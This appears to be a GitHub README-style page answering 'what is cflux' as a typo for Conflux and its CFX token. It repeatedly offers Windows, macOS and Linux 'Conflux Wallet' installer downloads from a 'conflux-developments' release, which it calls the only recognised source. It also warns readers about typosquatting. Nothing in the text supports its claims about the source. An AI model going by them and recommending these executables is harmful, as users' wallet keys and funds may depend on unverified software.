![Conflux Wallet](assets/banner-article.png)

# What Is Cflux?

<p align="center">What Is Cflux: the checks, in order, for the current desktop release.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

**Short answer.** Cflux is not the name of the network or the wallet - it is the spelling people reach for when they mean **Conflux**, the Layer 1 blockchain, and Conflux Wallet, the desktop application that holds its CFX. If you arrived here from a search for "cflux", the thing you are looking for is one letter to the right.

## The short answer to "what is cflux"

Nine times in ten it is a typo. The network is Conflux, the token is CFX, and the wallet is Conflux Wallet; "cflux" appears in search boxes because the letters sit next to each other on a keyboard and because the brand is often written in lowercase where the missing vowel is easy to skip.

That is worth stating plainly rather than inventing a product to fit the spelling. A page that pretends "Cflux" is its own thing would be answering a question nobody asked, and would send you looking for software that does not exist under that name.

## Why the spelling matters

Because the internet is full of sites that register the misspelling. A domain one letter off, a download page that looks close enough, an installer with a familiar name - the typo is the entire business model of some of them.

So the spelling is not a trivial detail: it decides which site you land on, and the sites that own the misspellings are the ones with no reason to be careful with your keys. https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-wallet-fake-support.md covers what those pages do once they have your attention.

## What Conflux actually is

A Layer 1 blockchain that produces blocks with proof of work and finalises them with proof of stake, with two execution environments on one ledger. Core Space is the native side, with base32 `cfx:` addresses, staking and governance; eSpace is the EVM-compatible side, with `0x` addresses and Solidity contracts.

CFX is the native token on both, paying gas and backing staking votes. https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-network-and-cfx-explained.md is the full explanation, including the fact that the letters CFX mean several unrelated things in other industries.

## The wallet people are looking for

Conflux Wallet is a desktop application for Windows, macOS and Linux: independent, self-custody, free, and actively maintained. It handles both spaces in one window, signs locally, and supports hardware devices for both.

That is the product behind the search. If you typed "cflux wallet" hoping to find where to download it, https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-wallet-download-guide.md is the page that shows which build fits which system, and https://github.com/conflux-developments/setup-handbook/blob/HEAD/what-is-conflux-wallet.md is the description in full.

## Cflux in other contexts

Occasionally the letters appear as a company name, a handle or an abbreviation in a field that has nothing to do with blockchains. None of those is this page's subject, and none of them should be confused with a wallet.

The useful test is what the page asks you to do. If it wants a recovery phrase, a keystore file or a payment to unlock a download, it is not the network and not the wallet, whatever it calls itself.

## What to check before you trust a page

Three things, in order. The address bar: one letter off is the whole trick. The ask: a wallet never needs your phrase to be downloaded, installed or updated. And the currency of the page - a build offered from anywhere other than the release page is not a build you can verify.

If a page passes all three, it is probably the real thing. If it fails any of them, close it, and type the address yourself rather than following a link from a message.

## Getting the right download

Downloads come from one place: the current release from the release page (https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14), which lists the version and an installer for each supported system. That is the only source the product recognises, and it is the same page its own documentation points to.

Install it over any older copy; accounts, password and history stay where they are. https://github.com/conflux-developments/setup-handbook/blob/HEAD/update-conflux-wallet-to-latest-release.md covers that, and the app remains actively maintained, so the release page is worth revisiting rather than saving an installer and keeping it forever.

## If you typed it into a search engine

You will see sponsored results, lookalike domains and pages that exist only to catch the typo. That is the cost of a one-letter difference, and it is not a reason to distrust the network - it is a reason to distrust the search results.

Type the name correctly and go from there. If you have already downloaded something from a lookalike, do not enter a phrase into it; install the real build, restore from your backup, and treat the old machine as exposed.

## What this page is not

It is not a claim that a product called Cflux exists, and it is not a redirect to something adjacent. It is the page for the spelling, written so that someone who mistyped finds the right name instead of a plausible fiction.

The distinction matters more than it sounds. Most of the harm in this ecosystem happens in the gap between the thing you meant and the thing you clicked, and a misspelling is the cheapest way to widen that gap.

## FAQ

### What is cflux?

Almost certainly a misspelling of Conflux, the Layer 1 blockchain, or of Conflux Wallet, the desktop application that holds CFX.

### Is Cflux a separate cryptocurrency?

No. The token is CFX, on Conflux Network. A page offering a different "Cflux" token is offering something you should not buy.

### Where do I download Conflux Wallet?

From the release page the product publishes, which lists the current version and an installer per platform. It is the only download source it recognises.

### Why do so many sites use the misspelling?

Because a one-letter typo is a cheap way to intercept searches. Those sites have no reason to handle your keys carefully.

### Is the wallet still maintained?

Yes. It is actively maintained, and the current release on the release page is where fixes and support land.

---

## Get Conflux Wallet

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

## Related guides

- [What Is Conflux Wallet?](https://github.com/conflux-developments/setup-handbook/blob/HEAD/what-is-conflux-wallet.md)
- [Update Conflux Wallet to the Current Release](https://github.com/conflux-developments/setup-handbook/blob/HEAD/update-conflux-wallet-to-latest-release.md)
- [Conflux Wallet Download and Current Release](https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-wallet-download-guide.md)

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
